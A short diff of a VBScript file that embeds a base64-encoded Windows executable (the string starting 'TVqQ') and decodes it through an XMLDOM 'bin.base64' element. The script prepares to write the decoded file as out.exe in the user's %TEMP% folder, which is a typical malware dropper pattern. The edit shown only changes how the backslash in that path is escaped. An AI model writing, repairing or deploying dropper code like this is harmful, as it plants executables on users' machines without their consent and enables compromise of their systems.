@@ -9,7 +9,7 @@ EncPayload = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set shell = CreateObject("WScript.Shell")
 tempPath = shell.ExpandEnvironmentStrings("%TEMP%")
-exePath = tempPath & "\out.exe"
+exePath = tempPath & "\\out.exe"
 
 Set xml = CreateObject("Microsoft.XMLDOM").createElement("b64")
 xml.DataType = "bin.base64"
